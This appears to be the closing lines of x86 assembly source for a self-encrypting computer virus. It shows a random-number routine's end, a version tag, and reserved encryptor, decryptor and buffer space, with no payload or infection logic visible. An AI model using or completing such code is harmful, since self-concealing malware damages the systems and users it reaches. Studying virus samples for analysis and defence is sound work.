	     mov     [random_num],ax	 ; Store 16-bit random number

	     ret			 ; Return
	     endp

	     db      '[ KREG 1.01 / AVL ]'
code_end:
encryptor:
	     db      100h dup(?)
encrypt_len  equ     word ptr $+09h	 ; Length of encrypted code
decryp_begin:
decryptor:
	     db      100h dup(?)
decryp_end:
buffer	     db      (code_end-code_begin) dup(?)
data_end:

end	     code_begin
